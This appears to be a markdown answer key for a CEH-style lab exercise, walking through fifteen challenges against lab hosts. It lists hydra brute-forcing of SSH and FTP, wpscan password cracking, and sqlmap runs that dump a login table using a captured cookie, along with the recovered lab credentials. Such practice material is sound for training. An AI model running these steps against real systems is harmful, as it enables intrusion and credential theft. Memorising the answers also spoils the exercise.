# PART III - Challenge 1  💬ANSWER: 172.30.10.200💬
#### C:\Users\Documents\$_Jack.pcapng 
### FILTER: tcp.flags.reset == 1
### INFO: Source → 172.30.10.200

# PART III - Challenge 2 💬ANSWER: lee/test💬
#### C:\Users\Downloads\Intercep_$niffer.pcapng 
### FILTER: http.request.method == POST
#### INFO: POST /login.aspx HTTP/1.1 (application/x-www-form-urlencoded)
#### HTML Form URL Encoded: application/x-www-form-urlencoded
####    Form item: "txtusername" == "lee"
####    Form item: "txtpwd" == "test"

# ⚠️ PART III - Challenge 3  💬ANSWER: 172.30.10.99💬
#### ~/Donwloads/cowrie.log
cat ~/Donwloads/cowrie.log
### INFO: 2024-09-11T01:28:11.805001Z [HoneyPotSSHTransport,1,172.30.10.99] Connection lost after 0 seconds

# ⚠️ PART III - Challenge 4  💬ANSWER: Apache💬
nmap -p 22 192.168.10.0/24 --open
# whatweb certifiedhacker.com
curl -I certifiedhacker.com
### INFO: Server → Apache 

# PART III - Challenge 5  💬ANSWER: i2tr&^72546HJ*💬
nmap -p 22 192.168.10.0/24 --open
hydra -l Martin -P /home/attacker/Desktop/password.txt ftp://192.168.10.101
### INFO: [22] [ssh] host: 192.168.10.101 login: Martin password: qwerty1234
ssh Martin@192.168.10.101
### PASSWORD: qwerty1234
#### ~/Desktop/$ollers.txt
dir # CONECTADO VIA SSH
cd Desktop
dir
type $ollers.txt
### INFO: Password to enter my crypto account: i2tr&^72546HJ*

# ⚠️ PART III - Challenge 6  💬ANSWER: 7867721010💬
ftp 192.168.10.111
### USERNAME: nick
### PASSWORD: apple
#### ~/Desktop/w_domain.txt
ls Desktop # CONECTADO VIA FTP
cd Desktop
pwd
get w_domain.txt

find . -name "w_domain.txt" # NOUTRO TERMINAL
cd ~/Desktop
cat w_domain.com
### INFO: "id":"7867721010"

# PART III - Challenge 7  💬ANSWER: Apache Tomcat/Coyote JSP engine 1.1💬
# whatweb http://172.30.10.99:8080
nmap -p 8080 172.30.10.99 -sV --open
### INFO: 8080/tcp  open  http  Apache Tomcat/Coyote JSP engine 1.1

# PART III - Challenge 8  💬ANSWER: EC-Council💬
ssh Martin@192.168.10.101
### PASSWORD: qwerty1234
#### C:\Users\Martin\Music\webpent.txt
dir # CONECTADO VIA SSH
cd Music
dir
type webpent.txt
### INFO: www.moviescope.com
whatweb www.moviescope.com
### INFO: ..., Meta-Author[EC-Council], ...

# ⚠️ PART III - Challenge 9  💬ANSWER: cros-site scripting (XSS)💬 && PART III - Challenge 10  💬ANSWER: Content Security Policy💬
owasp-zap
### Automated Run → URL to attack: https://www.goodshopping.com → Attack
### Alerts → User Controllable HTML Element Attibute (Potential XSS)
### INFO: Description → ... for XSS (cros-site scripting) ... 
### Alerts → Content Security Policy (CSP) Header Not Set
### INFO: Source → Passive (10038 - Content Security Policy (CSP) Header Not Set) 

# ⚠️ PART III - Challenge 11 💬ANSWER: 36💬
nmap -p 21,80,445,3389 -O 192.168.10/24
### INFO: 3389/tcp  closed  ms-wbt-server
find / -name users.txt 2>/dev/null
hydra -L ~/users.txt -P ~/rockyou.txt ftp://192.168.10.144 
### INFO: [21] [ftp] host: 192.168.10.144 login: Parker password: Passw0rd@1234

ftp 192.168.10.144 # NOUTRO TERMINAL
### USERNAME: Parker
### PASSWORD: Passw0rd@1234
#### C:\Users\Parker\Documents\w_report.pdf
ls  # CONECTADO VIA FTP
ls Documents
get Documents/w_report.pdf
bye

pdftotext Documents/w_report.pdf report.txt
grep -i "sensitive files" report.txt
### INFO: 12.36 Directory Listing of Sensitive Files

# ⚠️ PART III - Challenge 12 💬ANSWER: orange1234💬
curl -I http://www.cehorg.com:8080/CEH/wp-login.php
wpscan --url http://www.cehorg.com:8080/CEH/ --enumerate u
find / -name password.txt 2>/dev/null
wpscan --url http://www.cehorg.com:8080/CEH/ -U adam -P ~/Desktop/password.txt
### INFO: Username: adam, Password: orange1234

# PART III - Challenge 13 💬ANSWER: 3💬
#### C:\Users\Admin\Desktop\www.moviescope.com_09112024_0538.html
cd C:\Users\Admin\Desktop\
dir
#### GOOGLE: file://C:\Users\Admin\Desktop\www.moviescope.com_09112024_0538.html
### INFO: Content Security Policy Configuration     1
### INFO: Clickjacing Protection                    1
### INFO: MIME Type Confusion                       1

# PART III - Challenge 14 💬ANSWER: 5💬 && # PART III - Challenge 15 💬ANSWER: 19💬
#### GOOGLE: http://www.moviescope.com/ # Realizar login 
### USERNAME: lee
### PASSWORD: test
### Ctrl + Shift + I (Developer Tools) → Concole → document.cookie
### INFO: "mscope=WNklabw/oq4=; ui-tabs-1=0"
#### GOOGLE: http://www.moviescope.com/viewprofile.aspx?id=1 
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" -dbs
### INFO: available databases [9] ... [*] moviescope ...
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" -D moviescope --tables
### INFO: [11 tables] ... User_Login ...
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" -D moviescope -T User_Login --dump
### INFO: [5 entries] ... Uid → 5

# sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=WNklabw/oq4=; ui-tabs-1=0" --batch --level=1 --risk=1
#### GOOGLE: WASC SQL INJECTION → http://projects.webappsec.org/w/page/13246963/SQL Injection
### INFO: Reference ID → WASC-19